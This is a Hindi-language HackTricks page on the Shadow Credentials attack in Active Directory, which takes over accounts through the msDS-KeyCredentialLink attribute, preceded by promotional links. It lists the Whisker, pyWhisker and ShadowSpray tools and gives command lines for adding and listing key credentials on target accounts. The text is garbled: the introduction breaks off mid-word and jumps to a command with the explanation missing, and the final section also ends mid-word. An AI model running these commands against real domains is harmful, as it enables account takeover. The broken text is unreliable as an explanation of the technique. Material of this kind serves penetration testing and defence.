# छाया प्रमाणपत्र

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस चाहिए**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**द पीएएस परिवार**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**एनएफटीज़**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक पीएएस और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** ट्विटर पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**।**
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>

## परिचय <a href="#3f17" id="3f17"></a>

**इस तकनीक के बारे में [सभी जानकारी के लिए मूल पोस्ट की जांच करें](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)।**

**सारांश में**: यदि आप किसी उपयोगकर्ता/कंप्यूटर के **msDS-KeyCredentialLink** गुण को लिख सकते हैं, तो आप उस ऑब्ज
```shell
Whisker.exe add /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1
```
### [pyWhisker](https://github.com/ShutdownRepo/pywhisker)

यह **UNIX-आधारित सिस्टम** पर Whisker क्षमताओं को बढ़ाता है, Impacket और PyDSInternals का उपयोग करके पूर्ण शोषण क्षमताओं के लिए, जैसे KeyCredentials की सूची, जोड़ना, और हटाना, साथ ही उन्हें JSON प्रारूप में आयात और निर्यात करना।
```shell
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
```
### [शैडोस्प्रे](https://github.com/Dec0ne/ShadowSpray/)

शैडोस्प्रे का उद्देश्य है **डोमेन ऑब्ज
